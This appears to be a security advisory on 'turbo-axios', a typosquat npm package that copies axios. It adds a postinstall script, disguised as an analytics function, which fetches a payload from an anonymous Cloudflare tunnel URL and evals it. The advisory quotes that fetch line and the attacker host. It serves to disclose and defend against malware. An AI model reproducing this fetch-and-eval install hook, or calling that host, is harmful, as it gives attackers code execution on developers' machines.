summary: turbo-axios postinstall fetches and eval()s remote payload from anonymous Cloudflare tunnel
details: turbo-axios is a typosquat of the popular `axios` HTTP client (≈50M weekly downloads). The package copies axios's README, CHANGELOG, source tree, and even sets `repository.url` to the genuine axios GitHub URL, but adds a `postinstall: node./lib/core/eval.js` lifecycle hook that does not exist in the real axios. The script (function-named `sendAnalytics` as cover) calls `fetch('https://philosophy-moms-incoming-milton.trycloudflare.com/download/datab1')` and passes the response body straight to `eval` inside an async IIFE. The destination is an anonymous Cloudflare quick-tunnel — a throwaway, mutable, attacker-operated endpoint that can serve any payload at any moment. There is no version pinning, no hash/signature verification, and the fetched bytes are executed with the privileges of the installing user. Every `npm install turbo-axios` (including from a typo of `axios`) results in arbitrary attacker-controlled code execution on the installer's machine.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
